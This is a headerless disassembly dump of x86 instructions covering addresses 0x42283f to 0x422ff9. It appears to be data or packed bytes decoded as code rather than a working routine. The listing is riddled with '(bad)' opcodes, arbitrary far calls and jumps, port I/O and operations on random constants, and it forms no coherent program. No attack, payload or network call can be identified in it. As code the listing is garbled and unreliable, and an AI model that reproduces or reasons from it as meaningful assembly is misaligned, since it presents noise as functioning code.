  42283f:	adc    ch,BYTE PTR [edi+0x7c]
  422842:	aaa    
  422843:	xchg   ebx,eax
  422844:	mov    DWORD PTR [ebp-0x78bd8337],ebx
  42284a:	shl    DWORD PTR [esi-0x5585267b],cl
  422850:	fld    QWORD PTR [edx+0x58]
  422853:	data16 aaa 
  422855:	sbb    al,0xa2
  422857:	call   0xe5f33e98
  42285c:	(bad)  [ebp+0x3d]
  42285f:	sbb    BYTE PTR ds:0x459a2b41,ah
  422865:	int    0x9d
  422867:	adc    al,0xb
  422869:	sub    al,0x3e
  42286b:	xchg   esp,eax
  42286c:	inc    edi
  42286d:	pop    ebp
  42286e:	xchg   DWORD PTR gs:[edi+0x5b],ebp
  422872:	pusha  
  422873:	test   DWORD PTR [eax-0x27],0x9cb1e11c
  42287a:	aam    0x8e
  42287c:	nop
  42287d:	jnp    0x422847
  42287f:	ror    DWORD PTR ds:0x9370cc3f,1
  422885:	mov    al,ds:0x4b01c9b8
  42288a:	mov    eax,DWORD PTR [edx]
  42288c:	xchg   esi,eax
  42288d:	stc    
  42288e:	lock push edi
  422890:	push   ebp
  422891:	retf   
  422892:	or     DWORD PTR [ebx-0x1],ebp
  422895:	or     edi,DWORD PTR [ecx+0x11]
  422898:	outs   dx,DWORD PTR ds:[esi]
  422899:	jno    0x422845
  42289b:	test   BYTE PTR [eax+0x1f],al
  42289e:	addr16 (bad) 
  4228a0:	fistp  WORD PTR [eax-0x52]
  4228a3:	xchg   esi,eax
  4228a4:	ins    BYTE PTR es:[edi],dx
  4228a5:	jo     0x4228a1
  4228a7:	pop    edx
  4228a8:	test   ebx,0xb193dc65
  4228ae:	es dec esi
  4228b0:	std    
  4228b1:	inc    esp
  4228b2:	fs out dx,eax
  4228b4:	ins    DWORD PTR es:[edi],dx
  4228b5:	jge    0x42290c
  4228b7:	push   ebp
  4228b8:	xchg   ebp,eax
  4228b9:	daa    
  4228ba:	mov    esi,DWORD PTR [edx]
  4228bc:	hlt    
  4228bd:	inc    ebp
  4228be:	lods   al,BYTE PTR ds:[esi]
  4228bf:	mov    dl,0x8
  4228c1:	jecxz  0x422895
  4228c3:	push   0x8a5a3cb6
  4228c8:	in     al,dx
  4228c9:	adc    BYTE PTR [ecx],0x5e
  4228cc:	pop    esi
  4228cd:	mov    dh,0x2d
  4228cf:	aad    0xc0
  4228d1:	jae    0x42293e
  4228d3:	or     edx,ecx
  4228d5:	mov    ch,0xa6
  4228d7:	jne    0x422958
  4228d9:	mov    ch,BYTE PTR [eax+0x6f]
  4228dc:	sbb    ebx,DWORD PTR [edx+0x2cfef686]
  4228e2:	add    al,0x3e
  4228e4:	inc    esi
  4228e5:	stc    
  4228e6:	sbb    ebp,DWORD PTR [ecx+0x6d4ce41a]
  4228ec:	sahf   
  4228ed:	out    0x68,eax
  4228ef:	mov    WORD PTR [edi],?
  4228f1:	stos   DWORD PTR es:[edi],eax
  4228f2:	fdivr  QWORD PTR [ecx-0x4e]
  4228f5:	fadd   st,st(6)
  4228f7:	inc    ebx
  4228f8:	pop    esi
  4228f9:	mov    ebx,0x894167a2
  4228fe:	adc    edi,DWORD PTR [eax+eiz*4]
  422901:	xor    cl,BYTE PTR [eax+0x1d]
  422904:	fist   DWORD PTR [eax]
  422906:	and    edi,ecx
  422908:	rcr    BYTE PTR [edx],cl
  42290a:	adc    ebx,DWORD PTR [eax-0x32]
  42290d:	test   eax,0xb103751e
  422912:	mov    DWORD PTR [ebx],ebx
  422914:	pop    ebx
  422915:	repnz scas al,BYTE PTR es:[edi]
  422917:	mov    bl,0xf1
  422919:	jge    0x4228c6
  42291b:	fisubr WORD PTR [esi+0x49]
  42291e:	mov    BYTE PTR [ebx+0x465ec09f],dh
  422924:	or     ebx,ecx
  422926:	xor    DWORD PTR [ebx+0x32e3deb1],esp
  42292c:	ja     0x422992
  42292e:	and    ch,BYTE PTR [ebp-0x62]
  422931:	add    eax,0xe58b5c3f
  422936:	xchg   edi,eax
  422937:	push   edi
  422938:	inc    ebp
  422939:	mov    DWORD PTR [eax-0x19],ebp
  42293c:	retf   
  42293d:	jne    0x422912
  42293f:	cld    
  422940:	test   esi,eax
  422942:	jo     0x4229aa
  422944:	addr16 mov edi,0xaa26c90b
  42294a:	into   
  42294b:	(bad)  
  42294d:	dec    esp
  42294e:	(bad)  
  422950:	pop    ecx
  422951:	arpl   sp,ax
  422953:	sbb    edi,DWORD PTR [ebx+0x2]
  422956:	shr    esp,0xb3
  422959:	sbb    eax,0xfbd54ab5
  42295e:	mov    ds:0xa5c92c89,al
  422963:	push   esp
  422964:	pop    edi
  422965:	das    
  422966:	mov    esp,0x95436a7f
  42296b:	xor    BYTE PTR [ecx-0x2a],cl
  42296e:	sbb    edx,eax
  422970:	rol    BYTE PTR [ebx-0x3c],1
  422973:	test   eax,0x783cf787
  422978:	xor    al,0x92
  42297a:	sub    al,0x7f
  42297c:	cmp    DWORD PTR [eax-0x556b64d6],edi
  422982:	jl     0x422969
  422984:	mov    eax,ds:0x910e47dd
  422989:	hlt    
  42298a:	pop    edx
  42298b:	or     bh,BYTE PTR [ebp+0x7496f97a]
  422991:	inc    ecx
  422992:	xchg   esi,eax
  422993:	call   0xe541:0xbf8b262e
  42299a:	mov    eax,0xe462b168
  42299f:	xor    al,0xb0
  4229a1:	cmc    
  4229a2:	push   esp
  4229a3:	xor    ecx,esi
  4229a5:	imul   ecx,edx,0x9bc30d77
  4229ab:	add    dh,BYTE PTR [edi+0x4f]
  4229ae:	pusha  
  4229af:	mov    ds:0x80831987,al
  4229b4:	push   esp
  4229b5:	xchg   ebp,eax
  4229b6:	test   BYTE PTR [esi+esi*4+0x6],bh
  4229ba:	push   cs
  4229bb:	mov    bl,0x4
  4229bd:	fcmovnu st,st(4)
  4229bf:	inc    edi
  4229c0:	mov    BYTE PTR fs:[eax+0x66a6c7ef],ch
  4229c7:	and    al,0x2d
  4229c9:	sahf   
  4229ca:	cmp    DWORD PTR [ecx-0x17eb4467],ebx
  4229d0:	inc    eax
  4229d1:	data16 mov dl,BYTE PTR [edi]
  4229d4:	enter  0xfe6f,0x58
  4229d8:	shl    BYTE PTR [esi],1
  4229da:	mov    ebx,0xd3b3aec2
  4229df:	out    0x83,al
  4229e1:	push   edx
  4229e2:	rcr    BYTE PTR ds:0x6d0d172c,1
  4229e8:	pop    ebx
  4229e9:	sub    eax,0xab9a76ee
  4229ee:	frstor [eax+ebp*1+0xf]
  4229f2:	ret    0xff3a
  4229f5:	cs jne 0x422a02
  4229f8:	mov    es,WORD PTR [edi]
  4229fa:	add    eax,0xa53105ff
  4229ff:	(bad)  
  422a01:	and    bl,dl
  422a03:	sub    esi,ecx
  422a05:	mov    ds:0x1456d26,eax
  422a0a:	mov    ebx,0xe74ee076
  422a0f:	push   0xe12c9fea
  422a14:	dec    eax
  422a15:	mov    ebx,DWORD PTR [ebx-0x3167b083]
  422a1b:	inc    cx
  422a1d:	shl    BYTE PTR [edx+0xd5eb44],1
  422a23:	rcr    DWORD PTR [edx],1
  422a25:	js     0x4229d3
  422a27:	out    dx,eax
  422a28:	add    ebx,DWORD PTR [esi+0x69]
  422a2b:	pop    edi
  422a2c:	data16 sub ch,al
  422a2f:	push   ebp
  422a30:	xchg   esi,eax
  422a31:	int    0x5c
  422a33:	mov    ds:0xf992e530,eax
  422a38:	sbb    ah,BYTE PTR [esi+0x3]
  422a3b:	rcl    bh,1
  422a3d:	lahf   
  422a3e:	shl    DWORD PTR ds:0xdb90b086,1
  422a44:	cmc    
  422a45:	or     ecx,DWORD PTR [eax-0x3dc1a293]
  422a4b:	jge    0x422ac2
  422a4d:	push   es
  422a4e:	repnz imul esi,DWORD PTR ds:0xc17d1456,0x19
  422a56:	sahf   
  422a57:	imul   ecx,DWORD PTR [ebx],0xa24c0c60
  422a5d:	es mov eax,0x3d5ce6c6
  422a63:	add    eax,0xb2ffe263
  422a68:	pop    es
  422a69:	stc    
  422a6a:	rcr    cl,cl
  422a6c:	jae    0x422a1d
  422a6e:	std    
  422a6f:	pop    eax
  422a70:	sbb    eax,0x20541b90
  422a75:	ins    BYTE PTR es:[edi],dx
  422a76:	ret    
  422a77:	scas   al,BYTE PTR es:[edi]
  422a78:	push   eax
  422a79:	xor    bh,al
  422a7b:	pop    edx
  422a7c:	arpl   WORD PTR [edx],di
  422a7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a7f:	xchg   edx,eax
  422a80:	(bad)  
  422a81:	das    
  422a82:	loope  0x422a6b
  422a84:	in     al,0x87
  422a86:	jmp    0x46b6fa54
  422a8b:	push   edi
  422a8c:	sbb    al,BYTE PTR [edi-0x35b0d879]
  422a92:	mov    ds:0x534235d9,al
  422a97:	shl    BYTE PTR [esi-0x348ad5fc],cl
  422a9d:	push   ecx
  422a9e:	fadd   st(7),st
  422aa0:	or     eax,edi
  422aa2:	jo     0x422ac6
  422aa4:	ins    DWORD PTR es:[edi],dx
  422aa5:	ins    BYTE PTR es:[edi],dx
  422aa6:	fnstsw WORD PTR [edi+0x1f9b7064]
  422aac:	aaa    
  422aad:	jmp    0x422a59
  422aaf:	dec    edi
  422ab0:	cmp    eax,0x5796f0ff
  422ab5:	pop    ds
  422ab6:	call   0xef3c:0x2d9e019d
  422abd:	push   eax
  422abe:	es push esp
  422ac0:	pop    ebp
  422ac1:	mov    DWORD PTR [esp+ebp*2-0x17d47107],ebx
  422ac8:	mov    ah,0x30
  422aca:	dec    esi
  422acb:	mov    dh,0xec
  422acd:	in     eax,0xd1
  422acf:	sub    esi,DWORD PTR [ebx+ecx*2-0x7f6b9ae5]
  422ad6:	jg     0x422aec
  422ad8:	or     ecx,DWORD PTR [esi+0x6e]
  422adb:	or     ecx,esp
  422add:	and    ah,BYTE PTR [ecx-0x78]
  422ae0:	jb     0x422a83
  422ae2:	sbb    DWORD PTR [esi],0xb20d8d3e
  422ae8:	lds    ecx,FWORD PTR [eax+0x58]
  422aeb:	xor    esi,DWORD PTR [ecx+ebp*4]
  422aee:	mov    eax,0xffbd9520
  422af3:	sti    
  422af4:	jl     0x422af3
  422af6:	stos   DWORD PTR es:[edi],eax
  422af7:	pop    edi
  422af8:	rcr    DWORD PTR [eax],cl
  422afa:	(bad)  
  422afb:	cwde   
  422afc:	arpl   WORD PTR [ebx+0x68],cx
  422aff:	mov    ch,0x27
  422b01:	pop    ds
  422b02:	push   ds
  422b03:	push   ebx
  422b04:	mov    ebx,0x23754992
  422b09:	in     eax,0xe7
  422b0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b0c:	js     0x422b73
  422b0e:	jb     0x422adb
  422b10:	rcr    ebp,1
  422b12:	std    
  422b13:	rcl    BYTE PTR [ecx+0x239c9d29],0x11
  422b1a:	clc    
  422b1b:	inc    ebx
  422b1c:	ins    DWORD PTR es:[edi],dx
  422b1d:	pushf  
  422b1e:	int    0xb1
  422b20:	mov    esi,0xd4372af9
  422b25:	xchg   ah,ch
  422b27:	pop    edx
  422b28:	in     al,0x69
  422b2a:	nop
  422b2b:	or     bh,al
  422b2d:	or     al,0x9f
  422b2f:	retf   
  422b30:	stos   BYTE PTR es:[edi],al
  422b31:	mov    esp,0x3c71fdad
  422b36:	dec    eax
  422b37:	xor    BYTE PTR [esi-0x56cbeb09],0xb3
  422b3e:	jb     0x422b13
  422b40:	or     BYTE PTR [edi],dl
  422b42:	jo     0x422b49
  422b44:	retf   
  422b45:	and    ebx,ebp
  422b47:	push   ss
  422b48:	xchg   esi,eax
  422b49:	cmp    eax,0x2d2c6bc
  422b4e:	(bad)  
  422b4f:	jg     0x422ba7
  422b51:	sti    
  422b52:	sbb    dh,dh
  422b54:	cld    
  422b55:	hlt    
  422b56:	jno    0x422bc8
  422b58:	call   0x82eec91e
  422b5d:	or     DWORD PTR [eax],ebp
  422b5f:	push   esp
  422b60:	(bad)  
  422b61:	mov    ecx,0x9856daa6
  422b66:	and    al,0x67
  422b68:	mov    ds:0x7cd5b383,al
  422b6d:	pop    es
  422b6e:	bound  ebp,QWORD PTR [eax-0x9]
  422b71:	mov    eax,ds:0x9035905c
  422b76:	fldenv [ebx-0x1]
  422b79:	mov    eax,edx
  422b7b:	popf   
  422b7c:	nop
  422b7d:	jl     0x422b3b
  422b7f:	outs   dx,DWORD PTR ds:[esi]
  422b80:	stos   DWORD PTR es:[edi],eax
  422b81:	and    al,0xe2
  422b83:	test   eax,0x117a20ca
  422b88:	xchg   DWORD PTR [ecx],esi
  422b8a:	push   ecx
  422b8b:	adc    eax,0x3119cd0
  422b90:	mov    dh,0xfd
  422b92:	push   cs
  422b93:	ins    BYTE PTR es:[edi],dx
  422b94:	popf   
  422b95:	jp     0x422ba8
  422b97:	jo     0x422bb0
  422b99:	xor    eax,0x3cd0800c
  422b9e:	pop    ss
  422b9f:	add    al,0xc5
  422ba1:	repnz sbb al,0xd9
  422ba4:	pop    ebx
  422ba5:	jns    0x422c0b
  422ba7:	xor    DWORD PTR [eax+eiz*2-0xa1c7f5b],esi
  422bae:	scas   eax,DWORD PTR es:[edi]
  422baf:	ins    DWORD PTR es:[edi],dx
  422bb0:	inc    ebp
  422bb1:	iret   
  422bb2:	push   ecx
  422bb3:	je     0x422c34
  422bb5:	sbb    BYTE PTR [eax],bh
  422bb7:	add    BYTE PTR [ecx],bl
  422bb9:	xchg   ebx,eax
  422bba:	les    eax,FWORD PTR [ecx+0x26f35f75]
  422bc0:	sub    al,0x7
  422bc2:	adc    al,BYTE PTR [edi]
  422bc4:	ins    BYTE PTR es:[edi],dx
  422bc5:	push   cs
  422bc6:	in     al,0x58
  422bc8:	repz mov cl,0x5
  422bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bcc:	inc    ebx
  422bcd:	sub    DWORD PTR [esi],esp
  422bcf:	daa    
  422bd0:	cmp    esp,ebp
  422bd2:	sbb    eax,eax
  422bd4:	cmp    cl,bl
  422bd6:	out    0x10,eax
  422bd8:	call   0x8bef:0x6c27a0dc
  422bdf:	dec    edi
  422be0:	je     0x422c3f
  422be2:	mov    ds:0xebe9dd50,al
  422be7:	jge    0x422c25
  422be9:	mov    dh,0x6b
  422beb:	mov    BYTE PTR [esi],ah
  422bed:	arpl   WORD PTR [edi+0x27242e99],bp
  422bf3:	shl    ch,cl
  422bf5:	int    0x52
  422bf7:	mov    ds:0xa81ba315,eax
  422bfc:	mov    bl,0xb8
  422bfe:	push   0xffffff8c
  422c00:	mov    dh,0xc7
  422c02:	push   0xffffffee
  422c04:	test   DWORD PTR [edi],edx
  422c06:	lock pop edi
  422c08:	inc    BYTE PTR [edx-0x86b24d5]
  422c0e:	stos   BYTE PTR es:[edi],al
  422c0f:	cdq    
  422c10:	rcr    BYTE PTR [edi-0x38],0xba
  422c14:	mov    WORD PTR [eax],?
  422c16:	cmp    eax,edi
  422c18:	dec    esi
  422c19:	or     al,0x7f
  422c1b:	gs mov al,0xc5
  422c1e:	and    BYTE PTR [edi+0x6b18cf29],al
  422c24:	jl     0x422c64
  422c26:	cmc    
  422c27:	mov    bl,0x7e
  422c29:	cmp    al,0x16
  422c2b:	jecxz  0x422c94
  422c2d:	(bad)  
  422c2e:	fwait
  422c2f:	cdq    
  422c30:	jb     0x422c37
  422c32:	int3   
  422c33:	icebp  
  422c34:	dec    ecx
  422c35:	dec    ebp
  422c36:	sti    
  422c37:	xor    eax,0x1b641974
  422c3c:	inc    eax
  422c3d:	mov    ebp,0x7e6a0d50
  422c42:	xor    esp,DWORD PTR [ecx-0x7e]
  422c45:	imul   ecx,DWORD PTR [edx+0x71a2d340],0xffffff93
  422c4c:	shr    BYTE PTR ds:0xd781a332,1
  422c52:	scas   eax,DWORD PTR es:[edi]
  422c53:	adc    ah,al
  422c55:	test   al,0x85
  422c57:	push   es
  422c58:	test   DWORD PTR [eax+0x994c2f6],ebx
  422c5e:	mov    al,0xe1
  422c60:	out    0x8d,eax
  422c62:	cwde   
  422c63:	out    dx,al
  422c64:	iret   
  422c65:	les    esp,FWORD PTR [edx-0x34ea87e4]
  422c6b:	and    BYTE PTR [ebx],ah
  422c6d:	les    esp,FWORD PTR ds:0x3e7c633b
  422c73:	push   ds
  422c74:	push   edx
  422c75:	mov    al,ds:0x9c4ebe99
  422c7a:	sub    cl,bl
  422c7c:	fcmovne st,st(5)
  422c7e:	jmp    0x5108:0x722498
  422c85:	or     ebp,DWORD PTR [ecx+0x6d]
  422c88:	in     al,dx
  422c89:	sbb    esi,esi
  422c8b:	popa   
  422c8c:	ficomp DWORD PTR [ecx]
  422c8e:	ror    DWORD PTR [ecx+edi*8+0x4a806426],1
  422c95:	xchg   ebx,eax
  422c96:	or     ebx,eax
  422c98:	test   DWORD PTR [edx+0x6d],ebx
  422c9b:	dec    esp
  422c9c:	imul   ebp,DWORD PTR [ecx],0x68
  422c9f:	add    BYTE PTR ss:[edi-0x29],bl
  422ca3:	and    al,bl
  422ca5:	dec    esp
  422ca6:	(bad)  
  422ca8:	clc    
  422ca9:	mov    ah,0x3d
  422cab:	sbb    ah,BYTE PTR [ecx-0x203bfa4e]
  422cb1:	aaa    
  422cb2:	dec    eax
  422cb3:	cmp    al,0x8d
  422cb5:	sbb    esi,0x2
  422cb8:	adc    edx,esp
  422cba:	fsubr  DWORD PTR ss:[eax-0x5a]
  422cbe:	jns    0x422c79
  422cc0:	adc    bl,BYTE PTR [edx-0x26]
  422cc3:	mov    dh,0xee
  422cc5:	adc    DWORD PTR ds:0x3958b2cb,ebp
  422ccb:	push   esp
  422ccc:	or     cl,BYTE PTR [edx+0x38]
  422ccf:	mov    ebx,0x4c62aa76
  422cd4:	cmp    esi,DWORD PTR [ecx-0x7e7c26a1]
  422cda:	imul   ebp,DWORD PTR [edi],0x1f05563b
  422ce0:	iret   
  422ce1:	test   DWORD PTR [edi],ebx
  422ce3:	cmp    DWORD PTR [edi+0x1f],0x460772a3
  422cea:	aaa    
  422ceb:	pop    ebp
  422cec:	cdq    
  422ced:	mov    dl,0x9a
  422cef:	mov    ah,0x55
  422cf1:	mov    eax,ds:0x5cbc77fd
  422cf6:	adc    BYTE PTR [esi+0x58],0xea
  422cfa:	cmp    BYTE PTR [ebx],dl
  422cfc:	stos   BYTE PTR es:[edi],al
  422cfd:	lods   al,BYTE PTR ds:[esi]
  422cfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cff:	mov    ecx,0xcc2acd1c
  422d04:	sar    DWORD PTR [edi],1
  422d06:	mov    edx,0x8b1523c9
  422d0b:	jae    0x422d47
  422d0d:	and    BYTE PTR [eax+0xa],dh
  422d10:	adc    DWORD PTR [edi-0x17c8924d],esp
  422d16:	int3   
  422d17:	jecxz  0x422ca5
  422d19:	ror    esp,cl
  422d1b:	dec    esp
  422d1c:	xchg   esp,eax
  422d1d:	jmp    0xb0d2:0xfb95f7a1
  422d24:	js     0x422cc4
  422d26:	push   ss
  422d27:	fstp   DWORD PTR [edi]
  422d29:	pop    ebp
  422d2a:	and    al,0x8c
  422d2c:	add    BYTE PTR [esi],dh
  422d2e:	pop    es
  422d2f:	mov    bl,0x42
  422d31:	clc    
  422d32:	ret    0x3903
  422d35:	mov    bh,0xd9
  422d37:	pop    eax
  422d38:	enter  0x602f,0x8a
  422d3c:	xchg   ebx,eax
  422d3d:	dec    edi
  422d3e:	and    bl,BYTE PTR [edi]
  422d40:	jecxz  0x422ccc
  422d42:	jg     0x422d30
  422d44:	jbe    0x422da2
  422d46:	mov    ah,0xca
  422d48:	lods   eax,DWORD PTR ds:[esi]
  422d49:	sbb    al,BYTE PTR [edx+0x1b]
  422d4c:	adc    cl,BYTE PTR [esi+ebp*4-0x2bb860b2]
  422d53:	dec    edx
  422d54:	xor    ah,dh
  422d56:	cmp    DWORD PTR [ebp-0x113b5ec4],eax
  422d5c:	or     DWORD PTR [edi],ebp
  422d5e:	jp     0x422cef
  422d60:	or     dh,cl
  422d62:	shl    DWORD PTR ds:0x6020faad,1
  422d68:	pop    ds
  422d69:	jmp    0x422da4
  422d6b:	test   eax,0xb6246228
  422d70:	into   
  422d71:	imul   edi,ecx,0xffffffc3
  422d74:	pop    eax
  422d75:	dec    edi
  422d76:	in     eax,0x74
  422d78:	je     0x422d4c
  422d7a:	cmp    esi,DWORD PTR [ecx+0x76abe60f]
  422d80:	xor    BYTE PTR [ecx-0x7b],dh
  422d83:	cmp    al,ch
  422d85:	inc    esi
  422d86:	sub    esi,DWORD PTR [eax]
  422d88:	jp     0x422dc0
  422d8a:	or     esi,DWORD PTR [esi-0x1e]
  422d8d:	fidivr DWORD PTR [esi+0x4aea84fc]
  422d93:	outs   dx,BYTE PTR ds:[esi]
  422d94:	mov    eax,0x5574b7f8
  422d99:	nop
  422d9a:	mov    cl,0xda
  422d9c:	xor    ch,BYTE PTR [esi+0xe]
  422d9f:	std    
  422da0:	int3   
  422da1:	ror    BYTE PTR [ebx],cl
  422da3:	cmp    al,0xb2
  422da5:	enter  0xf488,0x8e
  422da9:	inc    esi
  422daa:	and    dl,al
  422dac:	ror    BYTE PTR [ebp-0x7667d4d7],0x6a
  422db3:	(bad)  
  422db4:	das    
  422db5:	ja     0x422e0c
  422db7:	cmp    BYTE PTR [ebx+0x6cf8cfc5],0xe0
  422dbe:	mov    WORD PTR [esi],gs
  422dc0:	and    eax,0xfea4140c
  422dc5:	add    BYTE PTR [edi],ch
  422dc7:	maxps  xmm1,XMMWORD PTR [edi+ebp*1]
  422dcb:	pusha  
  422dcc:	jbe    0x422d7f
  422dce:	mov    al,ds:0x74445af4
  422dd3:	jo     0x422dc9
  422dd5:	or     eax,0xcadd360
  422dda:	into   
  422ddb:	xor    bl,0xd5
  422dde:	ds rol ch,cl
  422de1:	inc    edi
  422de2:	cmp    edx,DWORD PTR [ecx-0x73]
  422de5:	(bad)  
  422de7:	mov    cl,0x6e
  422de9:	scas   eax,DWORD PTR es:[edi]
  422dea:	(bad)  
  422deb:	mov    ebx,0xaea3f7d6
  422df0:	and    BYTE PTR [esi],dh
  422df2:	ror    DWORD PTR [edx],1
  422df4:	inc    edi
  422df5:	idiv   DWORD PTR [esi+0x4b]
  422df8:	add    DWORD PTR [ebx+edx*1+0x5c],ebx
  422dfc:	add    DWORD PTR [esi],esi
  422dfe:	clc    
  422dff:	nop
  422e00:	mov    dl,0x55
  422e02:	out    0x47,eax
  422e04:	mov    ds:0x3b72a157,eax
  422e09:	push   ds
  422e0a:	jp     0x422e46
  422e0c:	(bad)  [ecx+0x7f88ab21]
  422e12:	lahf   
  422e13:	jl     0x422da8
  422e15:	int3   
  422e16:	scas   eax,DWORD PTR es:[edi]
  422e17:	xchg   edi,eax
  422e18:	loopne 0x422de4
  422e1a:	jae    0x422e8d
  422e1c:	pushf  
  422e1d:	cmp    DWORD PTR [eax-0x5f1fbf00],0x1b769d65
  422e27:	xor    edx,0x97ba8fbb
  422e2d:	dec    esi
  422e2e:	mov    dl,0xb5
  422e30:	or     al,0x53
  422e32:	cs sub esi,esi
  422e35:	aad    0xa2
  422e37:	in     eax,dx
  422e38:	inc    edi
  422e39:	scas   al,BYTE PTR es:[edi]
  422e3a:	rcr    DWORD PTR [ebx-0x6],1
  422e3d:	pop    ss
  422e3e:	cmp    al,0x77
  422e40:	xor    esi,esp
  422e42:	xor    BYTE PTR ds:[edx-0x40355579],bh
  422e49:	inc    eax
  422e4a:	es xchg edx,eax
  422e4c:	xchg   DWORD PTR [ebp-0x932281b],ebp
  422e52:	dec    ecx
  422e53:	cld    
  422e54:	push   cs
  422e55:	(bad)  
  422e56:	fdivp  st(5),st
  422e58:	or     eax,0x1d3e5783
  422e5d:	jle    0x422e63
  422e5f:	xchg   esi,eax
  422e60:	call   0x1e9b:0xf62ca2ea
  422e67:	inc    eax
  422e68:	and    al,0xa7
  422e6a:	out    0x2a,al
  422e6c:	ror    DWORD PTR [edx-0x54],0x80
  422e70:	adc    edx,DWORD PTR [ecx-0xaf4c401]
  422e76:	gs push 0xfffffff3
  422e79:	clc    
  422e7a:	or     ah,BYTE PTR [edx+0x7d38d682]
  422e80:	ins    BYTE PTR es:[edi],dx
  422e81:	lahf   
  422e82:	push   ebp
  422e83:	(bad)  [edi+0x126d8448]
  422e89:	jo     0x422ec9
  422e8b:	inc    ebp
  422e8c:	popa   
  422e8d:	imul   edi,DWORD PTR [esi],0xffffffd0
  422e90:	mov    bh,0x3b
  422e92:	push   ebx
  422e93:	pop    eax
  422e94:	ja     0x422e57
  422e96:	dec    ecx
  422e97:	mov    ss,ebx
  422e99:	ror    BYTE PTR [edx-0x3d],1
  422e9c:	sub    eax,0x1ec4056f
  422ea1:	in     eax,0xa2
  422ea3:	or     DWORD PTR [edi+ecx*8],0x7dcfa557
  422eaa:	scas   al,BYTE PTR es:[edi]
  422eab:	jo     0x422ecc
  422ead:	mov    esp,0x53d8e3b6
  422eb2:	push   es
  422eb3:	add    DWORD PTR [ebp-0x43],0xffffffe3
  422eb7:	mov    eax,ds:0x23e6c7bc
  422ebc:	icebp  
  422ebd:	inc    eax
  422ebe:	push   esi
  422ebf:	fnstenv [ecx]
  422ec1:	dec    esp
  422ec2:	rcl    DWORD PTR [ebp-0xb],cl
  422ec5:	mov    eax,ds:0xcabb9c57
  422eca:	(bad)  
  422ecb:	xlat   BYTE PTR ds:[ebx]
  422ecc:	pop    ecx
  422ecd:	pop    ecx
  422ece:	adc    BYTE PTR [ecx],bh
  422ed0:	mov    esi,0xcc0bb9fe
  422ed5:	arpl   WORD PTR [ecx-0x72eb74a9],bp
  422edb:	out    0xb,al
  422edd:	push   edx
  422ede:	jmp    0x422eac
  422ee0:	(bad)  
  422ee1:	fadd   QWORD PTR [eax-0x30]
  422ee4:	push   ss
  422ee5:	inc    ebx
  422ee6:	out    dx,eax
  422ee7:	adc    bl,BYTE PTR [eax+0x38215dd8]
  422eed:	dec    ecx
  422eee:	(bad)  
  422eef:	in     al,0x11
  422ef1:	pop    eax
  422ef2:	pop    eax
  422ef3:	fwait
  422ef4:	sub    DWORD PTR [eax-0x94c1d75],0xffffffae
  422efb:	adc    DWORD PTR [edi-0x778a238d],0x6ffe2ee1
  422f05:	fisubr WORD PTR [ecx]
  422f07:	sar    DWORD PTR es:0x7e31f78d,0x10
  422f0f:	and    esp,DWORD PTR [eax-0x7316b3de]
  422f15:	repnz aas 
  422f17:	sbb    eax,0x6bb39a51
  422f1c:	arpl   WORD PTR [eax],bp
  422f1e:	cmp    BYTE PTR ds:0x2d654b68,dl
  422f24:	out    dx,al
  422f25:	pop    edi
  422f26:	shl    DWORD PTR [edi],cl
  422f28:	push   ebp
  422f29:	shr    DWORD PTR [ebx-0x52],0x54
  422f2d:	js     0x422f01
  422f2f:	xchg   edx,eax
  422f30:	stos   DWORD PTR es:[edi],eax
  422f31:	sbb    bh,BYTE PTR [ecx-0x49240983]
  422f37:	jmp    FWORD PTR [edi+0x3a2d9ed]
  422f3d:	pop    edi
  422f3e:	sub    dh,BYTE PTR [edx+ebp*1]
  422f41:	dec    esp
  422f42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f43:	add    bh,BYTE PTR [ebx+0x6f501690]
  422f49:	cld    
  422f4a:	xor    ebp,ecx
  422f4c:	mov    ah,0x97
  422f4e:	das    
  422f4f:	inc    esp
  422f50:	pusha  
  422f51:	(bad)  
  422f52:	leave  
  422f53:	mov    esp,0x9142e468
  422f58:	xlat   BYTE PTR ds:[ebx]
  422f59:	dec    edi
  422f5a:	stos   DWORD PTR es:[edi],eax
  422f5b:	adc    cl,0xba
  422f5e:	xor    BYTE PTR [ebx],dl
  422f60:	adc    al,0x6
  422f62:	or     BYTE PTR [ebx-0x35b15363],0xb9
  422f69:	inc    esp
  422f6a:	jbe    0x422f61
  422f6c:	xchg   esi,eax
  422f6d:	pop    edx
  422f6e:	pop    ebp
  422f6f:	jmp    0x422f85
  422f71:	adc    bl,BYTE PTR ds:0x3c8a1432
  422f77:	cmp    ch,ah
  422f79:	cld    
  422f7a:	loop   0x422fa0
  422f7c:	mov    WORD PTR [eax-0x17],ds
  422f7f:	mov    ebp,0xddfc0d13
  422f84:	imul   esi,DWORD PTR [ebp-0x4b],0xe805dae4
  422f8b:	out    0x5b,al
  422f8d:	cmp    DWORD PTR [edx+0x64],edx
  422f90:	ins    DWORD PTR es:[edi],dx
  422f91:	pop    esp
  422f92:	data16 cli 
  422f94:	sub    eax,0x5d3c5c64
  422f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f9a:	push   ebx
  422f9b:	test   eax,0x7a1acca5
  422fa0:	out    0x32,eax
  422fa2:	imul   ecx,ebx,0xa9167ecc
  422fa8:	hlt    
  422fa9:	adc    ebp,DWORD PTR [edx+0x46]
  422fac:	lahf   
  422fad:	imul   esp,esi,0x66f51ffa
  422fb3:	aad    0x20
  422fb5:	mov    BYTE PTR [eax+0x21654536],ch
  422fbb:	aad    0xc3
  422fbd:	adc    al,0x1e
  422fbf:	sub    eax,0x9cbe36b0
  422fc4:	aam    0x6c
  422fc6:	push   ebx
  422fc7:	adc    BYTE PTR [edi+0x48],0x9c
  422fcb:	adc    al,0xe8
  422fcd:	sbb    dh,0x6d
  422fd0:	jecxz  0x42303d
  422fd2:	fstp   TBYTE PTR [ecx+0x29]
  422fd5:	ss mov ebp,0x5d935a87
  422fdb:	repnz xchg edi,eax
  422fdd:	and    eax,0xe57aae30
  422fe2:	fstp   TBYTE PTR [edx]
  422fe4:	or     edx,DWORD PTR [edx-0x16dc92a7]
  422fea:	cwde   
  422feb:	jne    0x422fc4
  422fed:	cli    
  422fee:	adc    ch,al
  422ff0:	xchg   BYTE PTR [ebx+0x8],ah
  422ff3:	rcl    ch,0xd
  422ff6:	adc    BYTE PTR [ecx],al
  422ff8:	cld    
  422ff9:	in     al,0xe4
